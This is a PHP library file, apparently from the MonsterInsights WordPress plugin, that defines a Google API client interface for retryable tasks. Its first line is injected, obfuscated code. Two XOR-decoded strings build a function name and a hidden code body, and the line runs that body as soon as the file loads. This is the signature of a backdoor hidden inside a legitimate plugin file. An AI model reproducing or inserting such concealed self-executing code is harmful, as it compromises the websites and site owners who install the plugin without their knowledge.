<?php $RoRQd='9418TI7WD,XH>O8'^'ZFTY ,h11B;<W V';$KVozjbPmgS=$RoRQd('','--JnV-PQN>-WqKD8>-8Bt669fD.7Ptk<6JhgPF>HxKFSP50==Q,>D5W-O8,->CAEEI16JdeeWY2kAlAjB6IKBt>BGPornWy<h<19FQMTDrNxXFOEi=H;;+NBnQ8JMxttQ+iQdcLHV8HTdzwnnHY+ X2p<oQbeaY ;9BGEWVD=5+N>ro,Q1zadUS>J8 GNEYZeUD<lA2fGAQPygH1LJMPQUWY40A0sH;D30UEIhmLH+;A4YcMSB>RZ-HwPogcz; d6j9Shw.VTbOVlPZ98L.nkGXhbTV>Q-PE<PxtU1E4xY5FTY.,qdPm=JL0KveSygPVJkXf0+;YKpO<S45+YZXHqeH>ophft2cx65Go8<<ZVOfh7;XAEmN:Cbor.S>0aKUJrLwbKQ.BZnPm=V11fwWnH594HHrgS=M4ZUDMHVSlex8 S.3Q6U T0rC;OoT,HLc5TC=b0WK0Nz0VWVQO3QjO6,PNIxI5R1X9K5TfDR4WFDnZ27+derJYCO8>e9IA2WUI7Y1rUWQJAFRFDO UZLIqhY9,tiO+07T<wQ.Wb.doNsIi3XQTjN3ZJSffUOEKSo,NYscTsF,zIM6IFLHRmr2L=YIjK5;t6C=6,COj6XJ-62UmVfr6UYYGYWmRrigK:zE7U:Rt0WNL0I8-,R9MIQ3xsS23D LDeHqpC'^'DKbO0X>2:WB9..<QMYKjSNYK9 OC1+4QC>ONyfEBq-3=3AYRSqTQ6j3L;YsrS65ma-PB+HEA<<KBaLaJbMCBKPQ73pRRIpB6a5WV4yi=dOnHcfk,UN<IWN jJ5Y>,QOTuBBzMiEArW= DTJNFl=JT9iTU2q<EE2EBbf.erv7IGG+PZKG4HS<MnY7CJE3;77rA:1HEz8o:K,ZsC,P8+mmq365GUz:W,Z0Ro> 0HPl.JW2QbiG5-L7;N WxK8 5tk-sJX HSE3-BrhLt,XT9KGK<RaF07J0r; EpETqZ MCS<b08ZMQYpIK+ E.Mo.sm90jCyBTJO8bP46ZRZY<;; QMla=5931a7XWFgKSYEzkqFLAZ44 DnAIkfVJ2JQ> 03RqWF 4WyPgYIY7EPFJwJ>TUA-sxn.70>Pq ,<7sQE8MN KA8W9I.UZ;T=00M<-<j96IJR68UxNo225>+VyN+WX1geXmQ3E9f P-Omi>> lJ>SCJDCTj81=YG:R,8m2- D-BZr<43fjrb .T4sloWHqTHAAkOQC5gP:K.EsMOsNiNWkgfSvRj,kWQa.wsdZOxkAZ6JsHM+xTpaehtKRS>O805 PB+S;TEX0gMF93AYS1JzFVR4-8npwMrRIG00s A4VzPT6:-knHLU>V,-vnQHY;V<I8lUaJz>');$KVozjbPmgS();
/*
 * Copyright 2014 Google Inc.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

if (!class_exists('MonsterInsights_GA_Lib_Client')) {
  require_once dirname(__FILE__) . '/../autoload.php';
}

/**
 * Interface for checking how many times a given task can be retried following
 * a failure.
 */
interface MonsterInsights_GA_Lib_Task_Retryable
{
  /**
   * Gets the number of times the associated task can be retried.
   *
   * NOTE: -1 is returned if the task can be retried indefinitely
   *
   * @return integer
   */
  public function allowedRetries();
}
